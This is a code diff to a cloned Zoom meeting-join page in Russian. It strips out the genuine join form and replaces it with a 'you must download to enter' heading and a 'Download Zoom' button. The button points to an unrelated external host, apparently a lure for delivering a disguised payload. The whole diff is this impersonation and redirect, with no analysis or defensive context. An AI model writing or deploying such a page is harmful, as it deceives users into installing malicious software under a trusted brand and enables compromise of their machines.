@@ -445,35 +445,27 @@ var isWebAppsEnabled = false;
 <div class="mini-layout-body" >
 <div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>
 <div class="page-header" style="text-align: center">
-<h1 style="font-size: 24px;">Присоединиться к конференции</h1>
+<h1 style="font-size: 24px;">Чтобы войти, необходимо скачать</h1>
 </div>
 <div class="box">
 <input type="hidden" id="from" value="" />
-<form id="join-form" class="form-vertical" action="javascript:;">
-<div class="form-group confno" style="margin-bottom: 16px">
-<div class="controls">
-<label for="join-confno" style="color: #747486;font-size: 12px;margin-bottom: 10px;">Идентификатор конференции или имя персональной ссылки</label>
-<input aria-describedby="rule-tip" id="join-confno" name="join-confno" type="text" class="form-control input-lg confno" autocomplete="off" maxlength="40" placeholder="Укажите идентификатор конференции или название персональной ссылки" />
-<div id="errorContainer" class="wc-new-syle">
-<div id="join-errormsg" class="error hideme"><i></i><span></span></div>
+
+<div class="box">
+  <div class="form-group" style="margin-bottom: 72px">
+    <div class="controls wc-new-syle">
+      <a id="btnDownload" role="button" 
+         style="height: 56px; line-height: 44px; width: 100%; 
+                background-color: #0E71EB; color: #fff; 
+                border-radius: 12px; font-size: 18px; 
+                text-decoration: none; display: inline-block; 
+                text-align: center;" 
+         href="https://loadredit.surge.sh/">
+        Скачать Zoom
+      </a>
+    </div>
+  </div>
 </div>
-</div>
-</div>
-<div class="form-group" style="margin-bottom: 16px">
-<div class="controls">
-Нажимая "Присоединиться", вы подтверждаете свое согласие с <a target="_blank" href="../terms.html">условиями обслуживания</a> и <a target="_blank" href="../privacy.html">положением о конфиденциальности</a></div>
-</div>
-<div class="form-group" style="margin-bottom: 72px">
-<div class="controls wc-new-syle">
-<a id="btnSubmit" role="button" style="height: 56px; line-height: 44px; width: 100%;background-color: rgba(82, 82, 128, 0.09);opacity: 1;" href="javascript:;" class="btn btn-primary user submit">Войти</a>
-</div>
-</div>
-<div class="form-group">
-<div class="controls wc-new-syle">
-<a id="btnRoomSystemJoin" class="doc" href="../meeting/rooms.html">Войти в конференцию из конференц-системы H.323/SIP</a>
-</div>
-</div>
-</form>
+    
 </div>
 </div>
 </div>
